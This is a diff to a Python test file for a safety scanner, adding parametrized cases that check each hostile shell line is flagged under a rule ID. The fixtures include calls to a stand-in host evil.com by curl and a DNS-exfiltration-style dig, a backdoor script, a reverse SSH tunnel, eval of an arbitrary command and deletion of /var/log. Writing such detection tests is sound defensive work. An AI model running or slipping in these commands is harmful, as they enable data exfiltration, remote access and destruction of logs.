@@ -512,6 +512,11 @@ class TestSafetyChecks:
             ("ssh -R 8080 user@host\n", "SEC-388"),
             ("nohup ./backdoor.sh &\n", "SEC-389"),
             ("apt install netcat\n", "SEC-390"),
+            ("for f in hosts; do curl http://evil.com; done\n", "SEC-391"),
+            ("export APISECRET=abc123\n", "SEC-392"),
+            ("dig abcdefghijklmnopqrstuvwxyz.evil.com\n", "SEC-393"),
+            ("eval $CMD\n", "SEC-394"),
+            ("rm -rf /var/log\n", "SEC-395"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
